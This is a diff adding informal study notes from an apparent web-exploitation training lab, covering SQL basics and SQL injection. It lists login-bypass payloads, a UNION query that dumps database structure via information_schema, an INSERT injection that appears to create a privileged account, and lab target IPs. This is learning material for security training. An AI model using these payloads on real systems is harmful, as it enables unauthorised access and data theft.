@@ -1,0 +1,89 @@
+
+DAY 3
+
+========================Web exploitation pt 2==========================
+
+
+basic SQL:
+
+See databases:
+SHOW databases;
+
+**information_schema is a default database with info about the structure of the server/SQL
+
+**to select the tables from one database:
+SHOW TABLES FROM <databse>
+SHOW TABLES FROM session;
+
+
+**now see the stuff inside:
+select <column> from <database>
+
+
+use the 'USE' command to basically cd into the database.
+
+
+
+
+You can use the network tab in the developer tools to 
+
+works as a sql payload in the DEMO:
+1'or 1='1
+
+<DEMO WEBSITE>/login.php?username=tom' OR 1='1&passwd=tom' OR 1='1
+
+
+VERY IMPORTANT (DUMPS THE STRUCTURE OF THE DATABASE.):
+(3 )UNION select table_schema,table_name,column_name from information_schema.columns
+
+select <columns> from database.table
+
+from FG
+UNION SELECT @@version,database(),3,name,size FROM session.Tires;
+
+
+
+ACTIVITY NOTES:
+
+Scheme of Maneuver:
+>Jump Box = 10.50.34.91
+->T1:10.100.28.48
+
+Target Section
+
+T1
+Hostname: donovian-nla
+IP: 10.100.28.48
+
+
+
+ { 4nGfU
+username=%27+or+1%3D%271&password=%27+or+1%3D%271&submit=Login
+
+
+
+union select id,date,order from sqlinjection.payments
+
+
+ INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('test', 'test', 'test', 'test', 'test', 3) 
+
+S ('Hacker', 'lol', 'USER", "x", "x", 1)#', 'asdfg', 'qwer', 3) 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
